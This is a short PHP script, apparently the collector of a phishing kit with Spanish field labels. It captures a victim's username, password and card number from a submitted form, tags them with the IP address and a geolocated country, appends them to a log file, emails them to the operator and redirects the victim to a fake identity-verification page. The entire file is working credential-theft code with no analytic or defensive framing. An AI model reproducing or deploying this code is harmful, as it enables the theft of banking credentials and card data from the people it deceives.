<?php
$ip = getenv("REMOTE_ADDR");
$date = date("M d, Y g:iA");
date_default_timezone_set('UTC');
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip)); 
$message .= "Usuario: ".$_POST['usrp']."   -  "; 
$message .="Clave: ".$_POST['pssd']." - "; 
$message .="tarjeta: ".$_POST['tarjeta']." - ";
$message .= "".$date."  - ";
$message .= "" . $ipdat->geoplugin_countryCode . " "; 
$message .="".$ip."\n";
$message .= "********************\n";
$fp = fopen('silfre21$.txt', 'a');
fwrite($fp, $message);
fclose($fp);
mail($to, $subj, $message, $from);
Header ("Location:validar-identidad.html");